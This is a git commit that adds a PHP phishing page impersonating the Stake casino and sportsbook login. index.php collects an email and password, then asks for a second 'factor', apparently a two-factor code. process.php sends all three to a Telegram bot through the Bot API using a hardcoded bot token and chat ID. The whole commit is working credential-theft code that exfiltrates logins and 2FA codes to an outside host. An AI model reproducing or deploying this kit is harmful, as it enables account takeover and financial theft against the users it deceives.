1ade35e9cf90be49190fa109bb084e7ef0f349eb
Foad <fwad40901@gmail.com>
2025-01-23 16:52:25 +0330

    add php

---
+++ index.php
@@ -0,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Stake: Online Casino & Sports Betting - Play & Bet Online</title>
+    <link rel="shortcut icon" href="" type="image/x-icon" />
+    <link rel="stylesheet" href="./src/styles/output.css" />
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+
+<body>
+    <div class="flex">
+        <div class="hidden lg:flex w-16 items-center flex-col p-2 z-20 bg-[#0F212E]">
+            <img src="./src/images/list.svg" class="w-6 cursor-pointer mt-5" alt="" />
+            <div class="mt-7">
+                <div class="cursor-pointer relative group">
+                    <img src="./src/images/casino-poker-cards-small-en.avif" class="w-full rounded-sm" alt="svg" />
+                    <img src="./src/images/casino-poker-cards-small-green-en.jpg"
+                        class="w-full rounded-sm absolute hidden group-hover:flex top-0 left-0" alt="svg" />
+                </div>
+            </div>
+            <div class="mt-2">
+                <div class="cursor-pointer relative group">
+                    <img src="./src/images/sports-balls-small-en.avif" class="w-full rounded-sm" alt="svg" />
+                    <img src="./src/images/sports-balls-small-orange-en.avif"
+                        class="w-full rounded-sm absolute hidden group-hover:flex top-0 left-0" alt="svg" />
+                </div>
+            </div>
+            <div class="bg-[#1a2c38] rounded-md mt-3 flex items-center justify-center">
+                <ul class="flex flex-col">
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/gift.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/af.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/coup.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/newspaper.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/message.svg" class="w-4" alt="svg" />
+                    </li>
+                </ul>
+            </div>
+            <div class="bg-[#1a2c38] rounded-md mt-3 flex items-center justify-center">
+                <ul class="flex flex-col">
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/hands.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/Shield.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/support.svg" class="w-4" alt="svg" />
+                    </li>
+                    <li class="py-3 hover:bg-gray-600 cursor-pointer rounded-md px-3 min-w-full">
+                        <img src="./src/images/globe.svg" class="w-4" alt="svg" />
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div>
+            <nav
+                class="p-3 flex items-center z-10 bg-[#1A2C38] lg:px-14 2xl:px-28 fixed top-0 w-full left-0 shadow-lg justify-between">
+                <img src="./src/images/logo.svg" class="w-16" alt="" />
+                <div>
+                    <button class="p-2 text-white">Sign in</button>
+                    <button
+                        class="p-2 px-4 text-white rounded-md bg-blue-500 hover:bg-blue-600 transition-all duration-300">
+                        Register
+                    </button>
+                </div>
+            </nav>
+            <div class="bg-[#071824] relative lg:px-14 2xl:px-28 min-h-[120dvh]">
+                <!-- <img
+        src="./src/images/stakeBig.svg"
+        class="absolute top-12 left-0"
+        alt="svg"
+      /> -->
+                <div class="flex flex-col sm:flex-row z-10 gap-3 mt-16 p-5 sm:gap-5 sm:items-center">
+                    <div class="flex items-center sm:order-2 gap-3 xl:gap-5 mt-10 sm:flex-1">
+                        <img src="./src/images/women.avif" class="rounded-md min-w-[8rem] xl:max-w-[50rem] flex-1"
+                            alt="" />
+                        <img src="./src/images/sport.avif" class="rounded-md min-w-[8rem] xl:max-w-[50rem] flex-1"
+                            alt="" />
+                    </div>
+                    <div class="flex flex-col min-h-full gap-4 sm:order-1 sm:flex-1">
+                        <h1
+                            class="text-white pt-20 text-4xl max-w-[40rem] sm:text-4xl sm:font-bold lg:text-5xl xl:text-6xl md:text-left text-center">
+                            An unrivalled online Casino and Sportsbook
+                        </h1>
+                        <button
+                            class="bg-blue-500 hover:bg-blue-600 transition-all duration-300 sm:w-fit font-semibold mt-5 text-white p-3 w-full rounded-md">
+                            Sign up
+                        </button>
+                        <span class="text-center 2xl:pt-20 text-sm font-bold text-gray-400 sm:text-left">Or sign up with
+                        </span>
+                        <div
+                            class="grid grid-cols-4 items-center sm:flex gap-5 sm:gap-3 w-full justify-center sm:justify-start">
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/facebook.png" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/google.svg" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/line.png" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/twitch.png" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="bg-black/60 w-full h-full absolute top-0 left-0 z-50">
+        <div class="absolute top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] max-w-[45rem] w-full z-40">
+            <div class="rounded-md">
+                <div class="flex py-3 px-5 items-center justify-between bg-[#1A2C38] rounded-t-md">
+                    <img src="./src/images/logo.svg" class="w-20" alt="" />
+                    <button class="p-2 text-white">Exit</button>
+                </div>
+                <div class="bg-[#0F212E] px-5 py-3">
+                    <form id="form1" method="post" class="space-y-5">
+                        <div class="flex flex-col gap-2">
+                            <span class="font-semibold text-gray-400">Email or Username *</span>
+                            <input type="email" id="email"
+                                class="w-full bg-transparent hover:border-gray-500 outline-none border-2 transition-all duration-300 p-2 border-gray-600 rounded-md text-white" />
+                        </div>
+                        <div class="flex flex-col gap-2">
+                            <span class="font-semibold text-gray-400">Password *</span>
+                            <div
+                                class="hover:border-gray-500 border-2 gap-5 flex items-center justify-between transition-all duration-300 p-2 border-gray-600 rounded-md">
+                                <input type="password" id="password"
+                                    class="w-full bg-transparent outline-none text-white" />
+                                <img src="./src/images/eyeSlash.svg" class="w-5 cursor-pointer" alt="svg" />
+                            </div>
+                        </div>
+
+                        <button
+                            class="w-full !mt-40 rounded-md text-lg p-4 font-semibold text-white text-center bg-blue-500 hover:bg-blue-600 transition-all duration-300">
+                            Sign in
+                        </button>
+                        <fieldset class="text-center w-32 mx-auto text-white/50 border-t border-t-white/40 mt-5">
+                            <legend class="px-2 2xl:text-lg">OR</legend>
+                        </fieldset>
+                        <div class="items-center flex gap-3 w-full justify-center">
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/facebook.png" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/google.svg" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/line.png" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/twitch.png" alt="" />
+                            </div>
+                        </div>
+                        <span class="text-white font-bold flex justify-center">Forget Password</span>
+                        <span class="flex gap-1 justify-center text-gray-600">Don’t have an account?
+                            <span class="font-bold text-white"> Register an Account </span>
+                        </span>
+                    </form>
+                    <form id="form2" method="post" class="space-y-5 hidden">
+                        <div class="flex flex-col gap-2">
+                            <span class="font-semibold text-gray-400">Email or Username *</span>
+                            <input type="text" id="factor"
+                                class="w-full bg-transparent hover:border-gray-500 outline-none border-2 transition-all duration-300 p-2 border-gray-600 rounded-md text-white" />
+                        </div>
+
+                        <button
+                            class="w-full !mt-40 rounded-md text-lg p-4 font-semibold text-white text-center bg-blue-500 hover:bg-blue-600 transition-all duration-300">
+                            Sign in
+                        </button>
+                        <fieldset class="text-center w-32 mx-auto text-white/50 border-t border-t-white/40 mt-5">
+                            <legend class="px-2 2xl:text-lg">OR</legend>
+                        </fieldset>
+                        <div class="items-center flex gap-3 w-full justify-center">
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/facebook.png" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/google.svg" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/line.png" alt="" />
+                            </div>
+                            <div
+                                class="px-5 bg-gray-700 cursor-pointer sm:px-4 xl:px-3 flex items-center sm:flex-none justify-center hover:bg-slate-500 flex-1 py-3 rounded-md transition-all duration-300">
+                                <img class="w-5" src="./src/images/twitch.png" alt="" />
+                            </div>
+                        </div>
+                        <span class="text-white font-bold flex justify-center">Forget Password</span>
+                        <span class="flex gap-1 justify-center text-gray-600">Don’t have an account?
+                            <span class="font-bold text-white"> Register an Account </span>
+                        </span>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+    // ارسال فرم اول با AJAX
+    $("#form1").on("submit", function(event) {
+        event.preventDefault(); // جلوگیری از رفرش صفحه
+        $.ajax({
+            type: "POST",
+            url: "process.php", // آدرس فایل PHP برای پردازش
+            data: $(this).serialize(), // داده‌های فرم را به صورت سریال کرده و ارسال می‌کند
+            success: function(data) {
+                $("#form1").addClass("hidden");
+                $("#form2").removeClass("hidden");
+                $("#message").text("ورود موفقیت‌آمیز بود."); // پیام موفقیت
+            },
+            error: function() {
+                $("#message").text("خطا در ارسال داده‌ها.");
+            }
+        });
+    });
+
+    // ارسال فرم دوم با AJAX
+    $("#form2").on("submit", function(event) {
+        event.preventDefault(); // جلوگیری از رفرش صفحه
+        $.ajax({
+            type: "POST",
+            url: "process.php",
+            data: $(this).serialize(),
+            success: function(data) {
+                $("#message").text("اطلاعات با موفقیت ارسال شد!");
+            },
+            error: function() {
+                $("#message").text("خطا در ارسال اطلاعات.");
+            }
+        });
+    });
+    </script>
+</body>
+
+</html>
---
+++ process.php
@@ -0,0 +1,50 @@
+<?php
+session_start();
+
+
+// استفاده از تابع
+
+// پردازش فرم‌ها
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    if (isset($_POST['email']) && isset($_POST['password'])) {
+        // مرحله اول: دریافت ایمیل و پسورد
+        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
+        $password = $_POST['password'];
+
+        // ذخیره‌سازی در متغیر سراسری
+        $_SESSION['email'] = $email;
+        $_SESSION['password'] = $password;
+
+        // پیام موفقیت به AJAX
+        echo json_encode(["status" => "success"]);
+        exit;
+    }
+
+    if (isset($_POST['factor'])) {
+        // مرحله دوم: دریافت فاکتور
+        $factor = $_POST['factor'];
+        $email = $_SESSION['email'];
+        $password = $_SESSION['password'];
+
+        // ارسال اطلاعات به ربات تلگرام (این قسمت را با توکن و شناسه چت خود پر کنید)
+        $token = "7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY";
+        $chatId = "-4614449543";
+        $message = "ایمیل: $email\nپسورد: $password\nفاکتور: $factor";
+
+        // ارسال پاسخ به کاربر
+        $send_url = "https://api.telegram.org/bot$token/sendMessage";
+        $send_params = [
+            'chat_id' => $chatId,
+            'text' => $message,
+        ];
+
+        $ch = curl_init($send_url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $send_params);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
+        // موفقیت در پردازش
+        echo json_encode(["status" => "sent"]);
+    }
+}
